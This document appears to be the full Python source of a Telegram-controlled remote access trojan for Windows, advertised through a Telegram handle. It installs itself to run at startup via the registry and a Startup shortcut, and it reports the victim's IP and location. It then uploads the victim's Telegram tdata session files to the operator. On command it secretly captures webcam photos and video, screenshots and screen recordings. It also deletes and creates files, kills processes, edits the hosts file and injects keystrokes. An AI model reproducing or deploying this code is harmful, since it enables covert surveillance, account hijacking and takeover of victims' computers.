import os
import platform
import requests
import pyautogui
import psutil
import telebot
from PIL import ImageGrab, Image
import winreg
import json
import webbrowser  # Импортируем модуль для работы с браузером
import re  # Импортируем модуль для регулярных выражений
import ctypes
import win32api
import win32con
import win32gui
import time
import win32process
import pywinauto
import cv2
import numpy as np
from io import BytesIO
import subprocess
import win32com.client
import sys
from moviepy.editor import AudioFileClip
from telebot import TeleBot
import zipfile
import shutil
from pynput.keyboard import Controller, Key
import pyautogui
import sys

# Контроллер для работы с клавиатурой
keyboard_controller = Controller()
#history&hash
import sqlite3
import win32crypt
import asyncio
from Crypto.Cipher import AES
import base64   
import socket
#АВТО ЗАГРУЗКА


def create_shortcut(exe_path, shortcut_name):
    # Путь к папке автозагрузки
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # Путь к ярлыку
    shortcut_path = os.path.join(startup_folder, f'{shortcut_name}.lnk')

    # Создание ярлыка
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.IconLocation = exe_path
    shortcut.save()
# Новый рабочий стол
def create_virtual_desktop():
    # Using the `ctypes` library to call Windows API for creating a new virtual desktop
    ctypes.windll.user32.SetProcessDPIAware()
    ctypes.windll.shcore.SetProcessDpiAwareness(1)

    # Load the Desktop Manager COM Object
    from win32com.client import Dispatch
    shell = Dispatch("WScript.Shell")
    shell.SendKeys('^{ESC}')  # Open the Start menu
    time.sleep(1)
    shell.SendKeys('^!{D}')  # Open the Task View (Windows Key + Tab)
    time.sleep(1)
    shell.SendKeys('^{D}')  # Create a new desktop (Ctrl + Win + D)

# Move the console window to the new desktop
def move_console_to_new_desktop():
    # Get the handle of the console window
    hwnd = win32gui.GetForegroundWindow()

    # Move the console window to the new desktop
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)

    # Switch to the new desktop
    ctypes.windll.user32.SwitchDesktop(hwnd)
# БОТ
TOKEN = ''
USER_ID = ''

# Create a bot instance
bot = telebot.TeleBot(TOKEN)

# ИНФА
def get_system_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return {
            '🟢 COMPUTER ON '
            'INFO '
            'IP': data.get('ip', 'N/A'),
            'City': data.get('city', 'N/A'),
            'Provider': data.get('org', 'N/A'),
            'Coordinates': f"{data.get('loc', 'N/A')}"
        }
    except Exception as e:
        return {'Error': str(e)}

# Send information to the Telegram bot
def send_info_to_telegram(info):
    message = "\n".join([f"{key}: {value}" for key, value in info.items()])
    bot.send_message(USER_ID, message)

# Capture screenshot and save it
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    return 'screenshot.png'

# Add script to startup
def add_to_startup():
    if platform.system() == 'Windows':
        script_path = os.path.abspath(__file__)
        key = winreg.HKEY_CURRENT_USER
        key_value = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'MyStartupApp', 0, winreg.REG_SZ, script_path)

# Remove script from startup
def remove_from_startup():
    if platform.system() == 'Windows':
        key = winreg.HKEY_CURRENT_USER
        key_value = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        try:
            with winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, 'MyStartupApp')
        except FileNotFoundError:
            pass
# Получение пути к рабочему столу
def get_desktop_path():
    return os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

# Создание указанного количества папок на рабочем столе
def create_folders_on_desktop(folder_count, folder_name_template):
    desktop_path = get_desktop_path()
    for i in range(1, folder_count + 1):
        folder_name = f"{folder_name_template} {i}"
        folder_path = os.path.join(desktop_path, folder_name)
        if not os.path.exists(folder_path):
            os.mkdir(folder_path)

# Заполнение всего рабочего стола папками
def create_full_desktop_folders(folder_name_template):
    # Получаем разрешение экрана
    screen_width, screen_height = pyautogui.size()
    
    # Предположим, что каждая папка будет занимать 100x100 пикселей
    folder_icon_size = (100, 100)
    
    # Количество папок, которые можно разместить по горизонтали и вертикали
    folders_per_row = screen_width // folder_icon_size[0]
    folders_per_column = screen_height // folder_icon_size[1]
    
    # Общее количество папок, которое можно разместить на экране
    total_folders = folders_per_row * folders_per_column
    
    create_folders_on_desktop(total_folders, folder_name_template)

# Функция для установки обоев на рабочий стол
def set_wallpaper(image_path):
    # Путь к файлу изображения
    abs_path = os.path.abspath(image_path)
    
    # Используем системную функцию для изменения обоев
    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)

# Создание указанного количества изображений на рабочем столе
def create_images_on_desktop(image, image_count, image_name_template):
    desktop_path = get_desktop_path()
    for i in range(1, image_count + 1):
        image_name = f"{image_name_template} {i}.png"  # Сохраняем картинку в формате PNG
        image_path = os.path.join(desktop_path, image_name)
        image.save(image_path)

# Заполнение всего рабочего стола изображениями
def create_full_desktop_images(image, image_name_template):
    # Получаем разрешение экрана
    screen_width, screen_height = pyautogui.size()
    
    # Предположим, что каждая картинка будет занимать 100x100 пикселей
    image_icon_size = (100, 100)
    
    # Количество картинок, которые можно разместить по горизонтали и вертикали
    images_per_row = screen_width // image_icon_size[0]
    images_per_column = screen_height // image_icon_size[1]
    
    # Общее количество картинок, которое можно разместить на экране
    total_images = images_per_row * images_per_column
    
    create_images_on_desktop(image, total_images, image_name_template)

# Установка обоев
def set_wallpaper(image_path):
    # Устанавливаем обои с помощью Windows API
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

# Получение пути к папке tdata
def find_telegram_tdata():
    # Проверка на диске C
    for root, dirs, files in os.walk("C:\\"):
        if "tdata" in dirs:
            return os.path.join(root, "tdata")
    
    # Проверка на диске D
    for root, dirs, files in os.walk("D:\\"):
        if "tdata" in dirs:
            return os.path.join(root, "tdata")
    
    return None

# Отправка папки tdata в Telegram
def send_tdata_to_telegram():
    tdata_path = find_telegram_tdata()
    
    if tdata_path:
        # Если папка найдена, отправим её содержимое в Telegram
        bot.send_message(USER_ID, f"Папка tdata найдена по пути: {tdata_path}")
        # Задача: можно добавить отправку файлов из этой папки, если нужно
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    bot.send_document(USER_ID, f)
    else:
        bot.send_message(USER_ID, "❌ Папка tdata не найдена.")


# Handle commands
@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.from_user.id == USER_ID:
        info = get_system_info()
        send_info_to_telegram(info)
        add_to_startup()
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")

@bot.message_handler(commands=['deskfile'])
def handle_deskfile(message):
    if message.from_user.id == USER_ID:
        # Разбиваем сообщение, чтобы извлечь параметры команды
        command_parts = message.text.split(' ', 2)
        
        if len(command_parts) < 3:
            bot.send_message(message.chat.id, "🚫 Неправильный формат команды. Используйте: /deskfile {количество или 'full'} {название папок}")
            return
        
        folder_count_or_full = command_parts[1]
        folder_name_template = command_parts[2]
        
        if folder_count_or_full.lower() == 'full':
            # Заполнение всего рабочего стола
            bot.send_message(message.chat.id, "💾 Заполняю весь рабочий стол папками...")
            create_full_desktop_folders(folder_name_template)
            bot.send_message(message.chat.id, "✅ Рабочий стол заполнен папками!")
        else:
            try:
                folder_count = int(folder_count_or_full)
                if folder_count > 0:
                    # Создание указанного количества папок
                    bot.send_message(message.chat.id, f"⌛ Создаю {folder_count} папок на рабочем столе...")
                    create_folders_on_desktop(folder_count, folder_name_template)
                    bot.send_message(message.chat.id, f"⏳ Создано {folder_count} папок на рабочем столе!")
                else:
                    bot.send_message(message.chat.id, "❗ Количество папок должно быть больше 0.")
            except ValueError:
                bot.send_message(message.chat.id, "❗ Укажите корректное количество папок или используйте ключевое слово 'full'.")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
# Команда для поиска папки tdata
@bot.message_handler(commands=['tdata'])
def handle_tdata(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "🔎 Ищу папку tdata...")
        send_tdata_to_telegram()
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['setwallpaper'])
def handle_set_wallpaper(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "🖼 Пожалуйста, отправьте изображение для установки на рабочий стол.")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")

# Обработка изображения, отправленного пользователем
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "⌛ Изображение получено, устанавливаю обои...")
        
        # Получаем информацию о фото
        file_info = bot.get_file(message.photo[-1].file_id)
        
        # Загружаем файл
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Сохраняем файл локально
        image_path = os.path.join(os.getcwd(), 'wallpaper.jpg')  # Путь для сохранения изображения
        with open(image_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Устанавливаем обои
        set_wallpaper(image_path)
        
        bot.send_message(message.chat.id, "✅ Обои успешно установлены!")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
# Обработка команды /deskimage
@bot.message_handler(commands=['deskimage'])
def handle_deskimage(message):
    if message.from_user.id == USER_ID:
        # Разбиваем сообщение, чтобы извлечь параметры команды
        command_parts = message.text.split(' ', 2)
        
        if len(command_parts) < 3:
            bot.send_message(message.chat.id, "🚫 Неправильный формат команды. Используйте: /deskimage {количество или 'full'} {название картинок}")
            return
        
        image_count_or_full = command_parts[1]
        image_name_template = command_parts[2]
        
        # Ожидаем изображение от пользователя
        bot.send_message(message.chat.id, "🖼 Пожалуйста, отправьте картинку для размещения на рабочем столе.")
        bot.register_next_step_handler(message, process_image_for_desk, image_count_or_full, image_name_template)
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
# Обработка изображения для команды /deskimage
def process_image_for_desk(message, image_count_or_full, image_name_template):
    if message.content_type == 'photo':
        # Получаем файл изображения
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        image = Image.open(BytesIO(downloaded_file))
        
        # Если пользователь выбрал полный рабочий стол
        if image_count_or_full.lower() == 'full':
            bot.send_message(message.chat.id, "⌛ Заполняю весь рабочий стол изображениями...")
            create_full_desktop_images(image, image_name_template)
            bot.send_message(message.chat.id, "✅ Рабочий стол заполнен изображениями!")
        else:
            try:
                image_count = int(image_count_or_full)
                if image_count > 0:
                    # Создание указанного количества изображений
                    bot.send_message(message.chat.id, f"⌛ Создаю {image_count} изображений на рабочем столе...")
                    create_images_on_desktop(image, image_count, image_name_template)
                    bot.send_message(message.chat.id, f"⏳ Создано {image_count} изображений на рабочем столе!")
                else:
                    bot.send_message(message.chat.id, "❗ Количество изображений должно быть больше 0.")
            except ValueError:
                bot.send_message(message.chat.id, "❗ Укажите корректное количество изображений или используйте ключевое слово 'full'.")
    else:
        bot.send_message(message.chat.id, "❗ Пожалуйста, отправьте изображение в виде фото.")

#фото_с_вебки
@bot.message_handler(commands=['take_photo'])
def handle_take_photo(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "🎥 Фоткаю Вебку")
        
        # Инициализация камеры
        cap = cv2.VideoCapture(0)
        
        # Захват одного кадра
        ret, frame = cap.read()
        
        # Освобождение камеры
        cap.release()
        
        if ret:
            # Кодирование изображения в формат PNG
            _, buffer = cv2.imencode('.png', frame)
            image_data = BytesIO(buffer)
            
            # Отправка изображения через Telegram
            bot.send_photo(message.chat.id, photo=image_data)
        else:
            bot.send_message(message.chat.id, "❌ Не удалось сделать снимок")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['screen'])
def handle_screen(message):
    if message.from_user.id == USER_ID:
        screenshot_path = capture_screenshot()
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['restart'])
def handle_restart(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "💫 Перезапуск ПК")
        remove_from_startup()  # Убедитесь, что у вас есть такая функция, или удалите эту строку
        os.system('shutdown /r /t 1')
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['close_all'])
def handle_close_all(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "💥 Закрытие Всех Программ")
        # Windows команд для закрытия всех окон
        os.system('taskkill /F /FI "STATUS eq RUNNING"')
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "💤 Выключение пк")
        remove_from_startup()
        os.system('shutdown /s /t 1')
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['browser'])
def handle_browser(message):
    if message.from_user.id == USER_ID:
        # Получаем URL из команды
        url = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        # Проверяем, что URL соответствует основным стандартам
        if re.match(r'^https?://', url):
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"💌 Открытие URL: {url}")
        else:
            bot.send_message(message.chat.id, "🚫 Неверный URL. Укажите действительный URL-адрес, начинающийся с http:// или https://.")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['title'])
def handle_title(message):
    if message.from_user.id == USER_ID:
        # Получаем текст сообщения после команды
        msg_text = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        if msg_text:
            # Создаем VBS скрипт для отображения сообщения
            vbs_script = f'MsgBox "{msg_text}", 48, "t.me/arkadasoft"'
            vbs_file_path = os.path.join(os.getenv('TEMP'), 'message.vbs')
            
            # Записываем VBS скрипт во временный файл
            with open(vbs_file_path, 'w') as vbs_file:
                vbs_file.write(vbs_script)
            
            # Запускаем VBS скрипт
            subprocess.run(['wscript', vbs_file_path], check=True)
            
            # Отправляем подтверждение в Telegram
            bot.send_message(message.chat.id, "🤗 Сообщение просмотрели и закрыли!")
        else:
            bot.send_message(message.chat.id, "/title {текст}")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['screen_off'])
def handle_screen_off(message):
    if message.from_user.id == USER_ID:
        # Выключение экрана
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
        bot.send_message(message.chat.id, "😴 Экран отключен (через пару секунд он включиться)")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")

@bot.message_handler(commands=['screen_on'])
def handle_screen_on(message):
    if message.from_user.id == USER_ID:
        # Включение экрана
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
        bot.send_message(message.chat.id, "Экран включен.")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['sys'])
def handle_system_stats(message):
    if message.from_user.id == USER_ID:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        memory_usage = memory_info.percent
        uptime = time.time() - psutil.boot_time()
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))

        stats = (f"CPU Usage: {cpu_usage}%\n"
                 f"Memory Usage: {memory_usage}%\n"
                 f"System Uptime: {uptime_str}")
        bot.send_message(message.chat.id, stats)
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['lock'])
def handle_lock(message):
    if message.from_user.id == USER_ID:
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(message.chat.id, "🔐 Пользователю вновь надо вводить пароль!")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['volume_up'])
def handle_volume_up(message):
    if message.from_user.id == USER_ID:
        for _ in range(10):
            win32api.keybd_event(0xAF, 0, 0, 0)  # Volume up
        bot.send_message(message.chat.id, "🔊 Звук прибавлен")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")

@bot.message_handler(commands=['volume_down'])
def handle_volume_down(message):
    if message.from_user.id == USER_ID:
        for _ in range(10):
            win32api.keybd_event(0xAE, 0, 0, 0)  # Volume down
        bot.send_message(message.chat.id, "🔉 Звук убавлен")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['get_processes'])
def handle_get_processes(message):
    if message.from_user.id == USER_ID:
        processes = [proc.info['name'] for proc in psutil.process_iter(['name'])]
        bot.send_message(message.chat.id, "\n".join(processes))
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(commands=['kill_process'])
def handle_kill_process(message):
    if message.from_user.id == USER_ID:
        process_name = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        if process_name:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == process_name:
                    proc.kill()
                    bot.send_message(message.chat.id, f"Process {process_name} killed.")
                    return
            bot.send_message(message.chat.id, "😶 Такого процесса нету")
        else:
            bot.send_message(message.chat.id, "😶 Please provide a process name.")
    else:
        bot.send_message(message.chat.id, "💢Вы не авторизованы в боте ;/ Если вы тоже хотите себе такого бота то вам в тг - t.me/arkadasoft")
@bot.message_handler(content_types=['audio', 'voice', 'video'])
def handle_media(message):
    try:
        file_info = bot.get_file(message.audio.file_id if message.audio else message.voice.file_id if message.voice else message.video.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open("temp_media", 'wb') as new_file:
            new_file.write(downloaded_file)

        audio = AudioFileClip("temp_media")
        audio.preview()  # Воспроизведение звука
        audio.close()

        bot.reply_to(message, "🎶 Аудио воспроизведено успешно.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при воспроизведении аудио: {e}")
# Команда /network_info для информации о сети
@bot.message_handler(commands=['net'])
def handle_network_info(message):
   if message.from_user.id == USER_ID:
    
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Информация о сети
    network_info = f"💻 Имя устройства: {hostname}\n🌐 IP-адрес: {local_ip}\n"
    bot.reply_to(message, network_info)

# Команда /ping <адрес>
@bot.message_handler(commands=['ping'])
def handle_ping(message):
   if message.from_user.id == USER_ID:

    
    try:
        address = message.text.split()[1]
        
        # Проверка операционной системы
        if sys.platform == "win32":
            # Пинг для Windows
            response = subprocess.run(['ping', '-n', '4', address], capture_output=True, text=True, encoding='cp866')
        else:
            # Пинг для Unix-систем
            response = subprocess.run(['ping', '-c', '4', address], capture_output=True, text=True)
        
        bot.reply_to(message, f"📶 Результат пинга:\n{response.stdout}")
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите адрес для пинга. Пример: /ping google.com")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка выполнения пинга: {e}")

# Команда /move_mouse <x> <y> для перемещения курсора
@bot.message_handler(commands=['move_mouse'])
def handle_move_mouse(message):
   if message.from_user.id == USER_ID:
    
    try:
        _, x, y = message.text.split()
        x, y = int(x), int(y)
        pyautogui.moveTo(x, y)
        bot.reply_to(message, f"👆 Курсор перемещен в точку ({x}, {y})")
    except ValueError:
        bot.reply_to(message, "❗ Неверный формат. Используйте: /move_mouse <x> <y>")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка перемещения курсора: {e}")

# Команда /click для клика мыши
@bot.message_handler(commands=['click'])
def handle_click(message):
    if message.from_user.id == USER_ID:
    
     pyautogui.click()
     bot.reply_to(message, "🥰 Клик выполнен")

# Команда /keyboard_press <key> для нажатия клавиши
@bot.message_handler(commands=['keyboard_press'])
def handle_keyboard_press(message):
  if message.from_user.id == USER_ID:

    try:
        key = message.text.split()[1]
        if key == "enter":
            keyboard_controller.press(Key.enter)
            keyboard_controller.release(Key.enter)
        else:
            keyboard_controller.press(key)
            keyboard_controller.release(key)
        bot.reply_to(message, f"📝 Клавиша '{key}' нажата")
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите клавишу. Пример: /keyboard_press a")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка нажатия клавиши: {e}")
# Команда /record_screen для записи экрана
@bot.message_handler(commands=['rec'])
def handle_record_screen(message):
  if message.from_user.id == USER_ID:

    # Продолжительность записи (в секундах)
    duration = 10  # Запись экрана в течение 10 секунд
    output_file = "screen_record.avi"

    # Параметры для записи видео
    screen_size = pyautogui.size()  # Получаем размер экрана
    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Кодек
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (screen_size))

    start_time = time.time()

    while True:
        # Захватываем скриншот экрана
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)  # Преобразуем в формат numpy
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # Преобразуем в формат BGR для OpenCV
        out.write(frame)  # Записываем кадр

        if time.time() - start_time >= duration:
            break
    
    out.release()  # Завершаем запись видео

    # Отправляем видео
    with open(output_file, 'rb') as video:
        bot.send_video(message.chat.id, video)
    
    # Удаляем временный файл
    os.remove(output_file)
    bot.reply_to(message, "✅ Запись экрана завершена и отправлена.")
# Команда /block_site для блокировки сайтов
@bot.message_handler(commands=['block_site'])
def handle_block_site(message):
  if message.from_user.id == USER_ID:

    
    try:
        site = message.text.split()[1]
        if platform.system() == "Windows":
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            redirect = "127.0.0.1"
        else:
            hosts_path = "/etc/hosts"
            redirect = "127.0.0.1"
        
        # Открытие файла hosts
        with open(hosts_path, "a") as hosts_file:
            hosts_file.write(f"{redirect} {site}\n")

        bot.reply_to(message, f"👾 Сайт {site} был заблокирован.")
    
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите сайт для блокировки. Пример: /block_site example.com")
    except Exception as e:
        bot.reply_to(message, f"🚫 Ошибка при блокировке сайта: {e}")
# Команда для перехода в спящий режим
@bot.message_handler(commands=['sleep'])
def handle_sleep(message):
  if message.from_user.id == USER_ID:
    
    if platform.system() == "Windows":
        subprocess.call("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    else:
        subprocess.call("systemctl suspend")
    
    bot.reply_to(message, "😴 Спящий режим включен!")
# Команда для получения списка файлов в директории
@bot.message_handler(commands=['list_files'])
def handle_list_files(message):
  if message.from_user.id == USER_ID:
    
    try:
        directory = message.text.split(maxsplit=1)[1]
        files = os.listdir(directory)
        files_list = '\n'.join(files)
        bot.reply_to(message, f"📂 Список файлов в {directory}:\n{files_list}")
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите директорию. Пример: /list_files /home/user")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
# Команда для удаления файла
@bot.message_handler(commands=['delete_file'])
def handle_delete_file(message):
  if message.from_user.id == USER_ID:

    try:
        file_path = message.text.split(maxsplit=1)[1]
        os.remove(file_path)
        bot.reply_to(message, f"🗑 Файл {file_path} был удален.")
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите путь к файлу для удаления. Пример: /delete_file /home/user/file.txt")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")
# Команда для создания файла
@bot.message_handler(commands=['create_file'])
def handle_create_file(message):
  if message.from_user.id == USER_ID:

    try:
        args = message.text.split(maxsplit=2)
        if len(args) != 3:
            raise IndexError
        file_path, content = args[1], args[2]
        with open(file_path, 'w') as f:
            f.write(content)
        bot.reply_to(message, f"📁 Файл {file_path} был создан с содержанием: {content}")
    except IndexError:
        bot.reply_to(message, "❗ Пожалуйста, укажите путь и содержание файла. Пример: /create_file /home/user/file.txt 'Hello World!'")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

# Команда для записи с веб-камеры
@bot.message_handler(commands=['webcam_record'])
def handle_webcam_record(message):
  if message.from_user.id == USER_ID:

    # Продолжительность записи (в секундах)
    duration = 10  # Запись в течение 10 секунд
    output_file = "webcam_record.avi"
    
    # Настройка захвата с камеры
    cap = cv2.VideoCapture(0)  # Используем первую доступную камеру
    if not cap.isOpened():
        bot.reply_to(message, "🚫 Не удалось получить доступ к веб-камере.")
        return

    # Параметры для записи видео
    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Кодек
    fps = cap.get(cv2.CAP_PROP_FPS) or 20  # Частота кадров
    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out = cv2.VideoWriter(output_file, fourcc, fps, (frame_width, frame_height))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)  # Записываем кадр
        
        if time.time() - start_time >= duration:
            break

    cap.release()
    out.release()
    
    # Отправка видео
    with open(output_file, 'rb') as video:
        bot.send_video(message.chat.id, video)

    # Удаление временного файла
    os.remove(output_file)
    bot.reply_to(message, "✅ Запись с веб-камеры завершена и отправлена.")
# Команда для получения системных логов
@bot.message_handler(commands=['get_logs'])
def handle_get_logs(message):
  if message.from_user.id == USER_ID:

    try:
        logs = ""
        if platform.system() == "Windows":
            logs_path = r"C:\Windows\System32\winevt\Logs\System.evtx"
            logs = subprocess.check_output(['wevtutil', 'qe', 'System', '/f:Text', '/c:5']).decode("utf-8")
        else:
            logs_path = "/var/log/syslog"
            with open(logs_path, 'r') as f:
                logs = f.read()

        # Отправляем логи
        bot.reply_to(message, f"📄 Логи:\n{logs[:1000]}...")  # Ограничим длину сообщения для удобства

    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при получении логов: {e}")



# Send information on startup
def send_on_startup():
    info = get_system_info()
    send_info_to_telegram(info)

# Start bot polling
def start_bot():
    send_on_startup()  # Send info immediately when the bot starts
    bot.polling()

if __name__ == '__main__':
    start_bot()
    create_virtual_desktop()
    add_to_startup()
    time.sleep(2)  # Wait for the new desktop to be created
    move_console_to_new_desktop()
    # Определение пути к скомпилированному .exe файлу
    exe_path = os.path.abspath(sys.argv[0])
    create_shortcut(exe_path, 'MyCompiledApp')